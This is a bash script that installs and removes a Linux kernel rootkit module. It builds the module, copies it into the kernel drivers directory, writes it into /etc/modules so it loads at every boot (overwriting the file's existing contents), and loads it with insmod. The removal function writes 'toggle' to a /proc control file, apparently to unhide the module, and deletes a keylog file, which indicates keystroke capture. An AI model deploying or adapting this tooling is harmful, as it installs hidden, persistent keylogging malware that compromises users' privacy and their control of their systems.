#!/bin/bash

MODULE_NAME="rootkit"
PROCFILE_NAME="rootkit"
KERNEL_VERSION=$(uname -r)
DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/rk_file_$MODULE_NAME"
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function install_rk() {
    if test -f "/proc/$PROCFILE_NAME"; then
        echo "[+] Removing rootkit"
        remove_rk
    fi
    echo "[+] Installing new rootkit"
    make all

    if [ ! -d $DRIVER_DIRECTORY ]; then
        mkdir -p $DRIVER_DIRECTORY
    fi

    cp "$PWD/build/rootkit.ko" "$DRIVER_DIRECTORY"
    echo "$MODULE_NAME" >/etc/modules
    insmod "$DRIVER_DIRECTORY/$MODULE_NAME.ko"
    depmod
}

function remove_rk() {
    rmmod $MODULE_NAME 2>/dev/null || (
        echo 'toggle' >/proc/$PROCFILE_NAME
        rmmod $MODULE_NAME
    )
    rm -rf $DRIVER_DIRECTORY
    rm /usr/rk_file_keylog
    echo '' >/etc/modules
    depmod
}

case $1 in
install)
    install_rk
    ;;
remove)
    remove_rk
    ;;
esac
